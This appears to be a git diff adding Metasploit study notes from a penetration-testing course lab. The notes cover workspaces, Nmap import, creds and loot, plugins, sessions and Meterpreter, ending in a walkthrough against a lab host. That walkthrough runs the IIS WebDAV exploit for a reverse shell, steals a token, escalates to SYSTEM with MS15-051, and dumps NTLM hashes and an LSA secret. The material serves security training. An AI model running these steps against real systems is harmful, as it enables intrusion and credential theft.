@@ -782,7 +782,6 @@ msf6>
 
 If we need to renitiate:
 
-
 ```shell-session
 $ msfdb reinit
 $ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
@@ -795,3 +794,1027 @@ msf6 > db_status
 ```
 
 
+## Using the Database
+
+With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our `Workspaces`.
+
+#### Workspaces
+
+We can think of `Workspaces` the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.
+
+To view the current Workspace list, use the `workspace` command. Adding a `-a` or `-d` switch after the command, followed by the workspace's name, will either `add` or `delete` that workspace to the database.
+
+```shell-session
+msf6 > workspace -a Target_1
+
+[*] Added workspace: Target_1
+[*] Workspace: Target_1
+
+
+msf6 > workspace Target_1 
+
+[*] Workspace: Target_1
+
+
+msf6 > workspace
+
+  default
+* Target_1
+```
+
+```shell-session
+msf6 > workspace -h
+
+Usage:
+    workspace                  List workspaces
+    workspace -v               List workspaces verbosely
+    workspace [name]           Switch workspace
+    workspace -a [name] ...    Add workspace(s)
+    workspace -d [name] ...    Delete workspace(s)
+    workspace -D               Delete all workspaces
+    workspace -r     Rename workspace
+    workspace -h               Show this help information
+```
+
+## Importing Scan Results
+
+Next, let us assume we want to import a `Nmap scan` of a host into our Database's Workspace to understand the target better. We can use the `db_import` command for this. After the import is complete, we can check the presence of the host's information in our database by using the `hosts` and `services` commands. Note that the `.xml` file type is preferred for `db_import`.
+
+```shell-session
+msf6 > db_import Target.xml
+
+[*] Importing 'Nmap XML' data
+[*] Import: Parsing with 'Nokogiri v1.10.9'
+[*] Importing host 10.10.10.40
+[*] Successfully imported ~/Target.xml
+
+
+msf6 > hosts
+
+Hosts
+=====
+
+address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------      ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.10.40             Unknown                    device         
+
+
+msf6 > services
+
+Services
+========
+
+host         port   proto  name          state  info
+----         ----   -----  ----          -----  ----
+10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
+10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
+10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
+```
+
+## Using Nmap inside MSFConsole
+
+```shell-session
+msf6 > db_nmap -sV -sS 10.10.10.8
+
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC
+[*] Nmap: Nmap scan report for 10.10.10.8
+[*] Nmap: Host is up (0.016s latency).
+[*] Nmap: Not shown: 999 filtered ports
+[*] Nmap: PORT   STATE SERVICE VERSION
+[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3
+[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
+
+
+msf6 > hosts
+
+Hosts
+=====
+
+address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------      ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.10.8              Unknown                    device         
+10.10.10.40             Unknown                    device         
+
+
+msf6 > services
+
+Services
+========
+
+host         port   proto  name          state  info
+----         ----   -----  ----          -----  ----
+10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
+10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
+10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
+10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
+10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
+```
+
+## Data Backup
+
+Backup our data with the `db_export` command:
+```shell-session
+msf6 > db_export -h
+
+Usage:
+    db_export -f <format> [filename]
+    Format can be one of: xml, pwdump
+[-] No output file was specified
+
+
+msf6 > db_export -f xml backup.xml
+
+[*] Starting export of workspace default to backup.xml [ xml ]...
+[*] Finished export of workspace default to backup.xml [ xml ]...
+```
+
+## Hosts
+
+The `hosts` command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. For example, suppose `msfconsole` is linked with scanner plugins that can perform service and OS detection. In that case, this information should automatically appear in the table once the scans are completed through msfconsole. Again, tools like Nessus, NexPose, or Nmap will help us in these cases.
+
+Hosts can also be manually added as separate entries in this table. After adding our custom hosts, we can also organize the format and structure of the table, add comments, change existing information, and more.
+
+## Services
+
+The `services` command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.
+
+## Credentials
+
+The `creds` command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.
+
+```shell-session
+msf6 > creds -h
+
+With no sub-command, list credentials. If an address range is
+given, show only credentials with logins on hosts within that
+range.
+
+Usage - Listing credentials:
+  creds [filter options] [address range]
+
+Usage - Adding credentials:
+  creds add uses the following named parameters.
+    user      :  Public, usually a username
+    password  :  Private, private_type Password.
+    ntlm      :  Private, private_type NTLM Hash.
+    Postgres  :  Private, private_type Postgres MD5
+    ssh-key   :  Private, private_type SSH key, must be a file path.
+    hash      :  Private, private_type Nonreplayable hash
+    jtr       :  Private, private_type John the Ripper hash type.
+    realm     :  Realm, 
+    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.
+
+Examples: Adding
+   # Add a user, password and realm
+   creds add user:admin password:notpassword realm:workgroup
+   # Add a user and password
+   creds add user:guest password:'guest password'
+   # Add a password
+   creds add password:'password without username'
+   # Add a user with an NTLMHash
+   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
+   # Add a NTLMHash
+   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
+   # Add a Postgres MD5
+   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
+   # Add a user with an SSH key
+   creds add user:sshadmin ssh-key:/path/to/id_rsa
+   # Add a user and a NonReplayableHash
+   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
+   # Add a NonReplayableHash
+   creds add hash:d19c32489b870735b5f587d76b934283
+
+General options
+  -h,--help             Show this help information
+  -o <file>             Send output to a file in csv/jtr (john the ripper) format.
+                        If the file name ends in '.jtr', that format will be used.
+                        If file name ends in '.hcat', the hashcat format will be used.
+                        CSV by default.
+  -d,--delete           Delete one or more credentials
+
+Filter options for listing
+  -P,--password <text>  List passwords that match this text
+  -p,--port <portspec>  List creds with logins on services matching this port spec
+  -s <svc names>        List creds matching comma-separated service names
+  -u,--user <text>      List users that match this text
+  -t,--type <type>      List creds that match the following types: password,ntlm,hash
+  -O,--origins <IP>     List creds that match these origins
+  -R,--rhosts           Set RHOSTS from the results of the search
+  -v,--verbose          Don't truncate long password hashes
+
+Examples, John the Ripper hash types:
+  Operating Systems (starts with)
+    Blowfish ($2a$)   : bf
+    BSDi     (_)      : bsdi
+    DES               : des,crypt
+    MD5      ($1$)    : md5
+    SHA256   ($5$)    : sha256,crypt
+    SHA512   ($6$)    : sha512,crypt
+  Databases
+    MSSQL             : mssql
+    MSSQL 2005        : mssql05
+    MSSQL 2012/2014   : mssql12
+    MySQL < 4.1       : mysql
+    MySQL >= 4.1      : mysql-sha1
+    Oracle            : des,oracle
+    Oracle 11         : raw-sha1,oracle11
+    Oracle 11 (H type): dynamic_1506
+    Oracle 12c        : oracle12c
+    Postgres          : postgres,raw-md5
+
+Examples, listing:
+  creds               # Default, returns all credentials
+  creds 1.2.3.4/24    # Return credentials with logins in this range
+  creds -O 1.2.3.4/24 # Return credentials with origins in this range
+  creds -p 22-25,445  # nmap port specification
+  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
+  creds -t NTLM       # All NTLM creds
+  creds -j md5        # All John the Ripper hash type MD5 creds
+
+Example, deleting:
+  # Delete all SMB credentials
+  creds -d -s smb
+```
+
+## Loot
+
+The `loot` command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
+
+#### MSF - Stored Loot
+
+```shell-session
+msf6 > loot -h
+
+Usage: loot [options]
+ Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
+  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
+  Del: loot -d [addr1 addr2 ...]
+
+  -a,--add          Add loot to the list of addresses, instead of listing
+  -d,--delete       Delete *all* loot matching host and type
+  -f,--file         File with contents of the loot to add
+  -i,--info         Info of the loot to add
+  -t <type1,type2>  Search for a list of types
+  -h,--help         Show this help information
+  -S,--search       Search string to filter by
+```
+
+# Plugins
+
+Plugins are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework. These can represent commercial products that have a `Community Edition` for free use but with limited functionality, or they can be individual projects developed by individual people.
+
+`/usr/share/metasploit-framework/plugins`,  is the default directory for every new installation of `msfconsole`
+
+If a plugin is in the default directory it can be loaded with `load plugin`
+
+```shell-session
+msf6 > load nessus
+
+[*] Nessus Bridge for Metasploit
+[*] Type nessus_help for a command listing
+[*] Successfully loaded Plugin: Nessus
+
+
+msf6 > nessus_help
+
+Command                     Help Text
+-------                     ---------
+Generic Commands            
+-----------------           -----------------
+nessus_connect              Connect to a Nessus server
+nessus_logout               Logout from the Nessus server
+nessus_login                Login into the connected Nessus server with a different username and 
+
+<SNIP>
+
+nessus_user_del             Delete a Nessus User
+nessus_user_passwd          Change Nessus Users Password
+                            
+Policy Commands             
+-----------------           -----------------
+nessus_policy_list          List all polciies
+nessus_policy_del           Delete a policy
+```
+
+Install new plugins by putting the .rb fil into the default directory and set the permissions.
+
+Popular plugins:
+<tbody>
+<tr>
+<td><a href="[https://nmap.org](view-source:https://nmap.org/)" target="_blank" rel="noopener nofollow">nMap (pre-installed)</a></td>
+<td><a href="[https://sectools.org/tool/nexpose/](view-source:https://sectools.org/tool/nexpose/)" target="_blank" rel="noopener nofollow">NexPose (pre-installed)</a></td>
+<td><a href="[https://www.tenable.com/products/nessus](view-source:https://www.tenable.com/products/nessus)" target="_blank" rel="noopener nofollow">Nessus (pre-installed)</a></td>
+</tr>
+<tr>
+<td><a href="[http://blog.gentilkiwi.com/mimikatz](view-source:http://blog.gentilkiwi.com/mimikatz)" target="_blank" rel="noopener nofollow">Mimikatz (pre-installed V.1)</a></td>
+<td><a href="[https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi](view-source:https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi)" target="_blank" rel="noopener nofollow">Stdapi (pre-installed)</a></td>
+<td><a href="[https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation](view-source:https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation)" target="_blank" rel="noopener nofollow">Railgun</a></td>
+</tr>
+<tr>
+<td><a href="[https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb](view-source:https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb)" target="_blank" rel="noopener nofollow">Priv</a></td>
+<td><a href="[https://www.offensive-security.com/metasploit-unleashed/fun-incognito/](view-source:https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)" target="_blank" rel="noopener nofollow">Incognito (pre-installed)</a></td>
+<td><a href="[https://github.com/darkoperator/Metasploit-Plugins](view-source:https://github.com/darkoperator/Metasploit-Plugins)" target="_blank" rel="noopener nofollow">Darkoperator's</a></td>
+</tr>
+</tbody>
+
+---
+
+## Mixins
+
+The Metasploit Framework is written in Ruby, an object-oriented programming language. This plays a big part in what makes `msfconsole` excellent to use. Mixins are one of those features that, when implemented, offer a large amount of flexibility to both the creator of the script and the user.
+
+Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when we:
+
+1.  Want to provide a lot of optional features for a class.
+2.  Want to use one particular feature for a multitude of classes.
+
+Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word `include`, to which we pass the name of the module as a `parameter`. We can read more about mixins [here](https://en.wikibooks.org/wiki/Metasploit/UsingMixins).
+
+If we are just starting with Metasploit, we should not worry about the use of Mixins or their impact on our assessment. However, they are mentioned here as a note of how complex the customization of Metasploit can become.
+
+# Sessions
+
+MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of `Sessions`, which creates dedicated control interfaces for all of your deployed modules.
+
+## Using Sessions
+
+Background a session with `[CTL] + [z]` or typing `background`
+
+### Listing Active Sessions
+
+Use the `session` command to view currently active sessions. Use `sessions -i #` to open a specific session.
+
+We can background a session, and then use an new exploit via a different module. If the module allows us to use the already open channel it will be an option in the second module's options.
+
+## Jobs
+
+If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using `[CTRL] + [C]`. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the `jobs` command to look at the currently active tasks running in the background and terminate the old ones to free up the port.
+
+Other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly, even if the session dies or disappears.
+
+```shell-session
+msf6 exploit(multi/handler) > jobs -h
+Usage: jobs [options]
+
+Active job manipulation and interaction.
+
+OPTIONS:
+
+    -K        Terminate all running jobs.
+    -P        Persist all running jobs on restart.
+    -S <opt>  Row search filter.
+    -h        Help banner.
+    -i <opt>  Lists detailed information about a running job.
+    -k <opt>  Terminate jobs by job ID and/or range.
+    -l        List all running jobs.
+    -p <opt>  Add persistence to job by job ID
+    -v        Print more detailed info.  Use with -i and -l
+```
+
+#### Viewing the Exploit Command Help Menu
+
+When we run an exploit, we can run it as a job by typing `exploit -j`. Per the help menu for the `exploit` command, adding `-j` to our command. Instead of just `exploit` or `run`, will "run it in the context of a job."
+
+```shell-session
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.14.34:4444
+```
+
+# Meterpreter
+
+The `Meterpreter` Payload is a specific type of multi-faceted, extensible Payload that uses `DLL injection` to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.
+
+For some interesting reading, check out this [post](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/) on Meterpreter stageless payloads and this [post](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion) on modifying Metasploit templates for evasion.
+
+## Running Meterpreter
+
+To run Meterpreter, we only need to select any version of it from the `show payloads` output, taking into consideration the type of connection and OS we are attacking.
+
+When the exploit is completed, the following events occur:
+
+-   The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.
+    
+-   The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.
+    
+-   The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.
+    
+-   Lastly, Meterpreter loads extensions. It will always load `stdapi` and load `priv` if the module gives administrative rights. All of these extensions are loaded over AES encryption.
+
+## MSF - Meterpreter Commands
+
+```shell-session
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+```
+
+## Using Meterpreter
+
+### Scanning
+
+```shell-session
+msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
+
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
+[*] Nmap: Nmap scan report for 10.10.10.15
+[*] Nmap: Host is up (0.021s latency).
+[*] Nmap: Not shown: 65534 filtered ports
+[*] Nmap: PORT   STATE SERVICE VERSION
+[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
+[*] Nmap: | http-methods:
+[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
+[*] Nmap: |_http-title: Under Construction
+[*] Nmap: | http-webdav-scan:
+[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+[*] Nmap: |   WebDAV type: Unknown
+[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT
+[*] Nmap: |_  Server Type: Microsoft-IIS/6.0
+[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds
+
+msf6 > hosts
+
+Hosts
+=====
+
+address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------      ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.10.15             Unknown                    device         
+
+
+msf6 > services
+
+Services
+========
+
+host         port  proto  name  state  info
+----         ----  -----  ----  -----  ----
+10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
+```
+
+```shell-session
+msf6 > search iis_webdav_upload_asp
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
+
+
+msf6 > use 0
+
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options
+
+Module options (exploit/windows/iis/iis_webdav_upload_asp):
+
+   Name          Current Setting        Required  Description
+   ----          ---------------        --------  -----------
+   HttpPassword                         no        The HTTP password to specify for authentication
+   HttpUsername                         no        The HTTP username to specify for authentication
+   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
+   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
+   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT         80                     yes       The target port (TCP)
+   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
+   VHOST                                no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+
+### MSF - Configuring Exploit and Payload
+
+```shell-session
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
+
+RHOST => 10.10.10.15
+
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
+
+LHOST => tun0
+
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
+
+[*] Started reverse TCP handler on 10.10.14.26:4444 
+[*] Checking /metasploit28857905.asp
+[*] Uploading 612435 bytes to /metasploit28857905.txt...
+[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
+[*] Executing /metasploit28857905.asp...
+[*] Sending stage (175174 bytes) to 10.10.10.15
+[*] Deleting /metasploit28857905.asp (this doesn't always work)...
+[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
+[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000
+
+meterpreter > 
+```
+
+### MSF - Meterpreter Migration
+
+```shell-session
+meterpreter > getuid
+
+[-] 1055: Operation failed: Access is denied.
+
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]                                                
+ 4     0     System                                                          
+ 216   1080  cidaemon.exe                                                    
+ 272   4     smss.exe                                                        
+ 292   1080  cidaemon.exe                                                    
+<...SNIP...>
+
+ 1712  396   alg.exe                                                         
+ 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1920  396   dllhost.exe                                                     
+ 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
+ 2312  592   wmiprvse.exe                                                    
+ 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 4076  1080  cidaemon.exe                                                    
+
+
+meterpreter > steal_token 1836
+
+Stolen token with username: NT AUTHORITY\NETWORK SERVICE
+
+
+meterpreter > getuid
+
+Server username: NT AUTHORITY\NETWORK SERVICE
+```
+
+### MSF - Session Handling
+
+```shell-session
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
+msf6 post(multi/recon/local_exploit_suggester) > show options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+
+SESSION => 1
+
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 34 exploit checks are being tried...
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+msf6 post(multi/recon/local_exploit_suggester) > 
+```
+
+### MSF Privilege Escalation
+
+```shell-session
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images
+
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
+
+Module options (exploit/windows/local/ms15_051_client_copy_image):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
+
+session => 1
+
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
+
+LHOST => tun0
+
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > run
+
+[*] Started reverse TCP handler on 10.10.14.26:4444 
+[*] Launching notepad to host the exploit...
+[+] Process 844 launched.
+[*] Reflectively injecting the exploit DLL into 844...
+[*] Injecting exploit into 844...
+[*] Exploit injected. Injecting payload into 844...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175174 bytes) to 10.10.10.15
+[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000
+
+
+meterpreter > getuid
+
+Server username: NT AUTHORITY\SYSTEM
+```
+
+### MSF - Dump Hashes
+
+```shell-session
+meterpreter > hashdump
+
+Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
+ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
+IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
+Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::
+
+
+meterpreter > lsa_dump_sam
+
+[+] Running as SYSTEM
+[*] Dumping SAM
+Domain : GRANNY
+SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
+Local SID : S-1-5-21-1709780765-3897210020-3926566182
+
+SAMKey : 37ceb48682ea1b0197c7ab294ec405fe
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
+  Hash NTLM: d6908f022af0373e9e21b8a241c86dca
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003e9 (1001)
+User : SUPPORT_388945a0
+  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6
+
+RID  : 000003eb (1003)
+User : IUSR_GRANPA
+  Hash LM  : a274b4532c9ca5cdf684351fab962e86
+  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88
+
+RID  : 000003ec (1004)
+User : IWAM_GRANPA
+  Hash LM  : 95d112c4da2348b599183ac6b1d67840
+  Hash NTLM: a97f39734c21b3f6155ded7821d04d16
+
+RID  : 000003ef (1007)
+User : ASPNET
+  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b
+  Hash NTLM: edc0d5506804653f58964a2376bbd769
+
+RID  : 000003f1 (1009)
+User : Lakis
+  Hash LM  : f927b0679b3cc0e192410d9b0b40873c
+  Hash NTLM: 3064b6fc432033870c6730228af7867c
+```
+
+### Meterpreter - LSA Secrets Dump
+
+```shell-session
+meterpreter > lsa_dump_secrets
+
+[+] Running as SYSTEM
+[*] Dumping LSA secrets
+Domain : GRANNY
+SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
+
+Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
+Domain name : HTB
+
+Policy subsystem is : 1.7
+LSA Key : ada60ee248094ce782807afae1711b2c
+
+Secret  : aspnet_WP_PASSWORD
+cur/text: Q5C'181g16D'=F
+
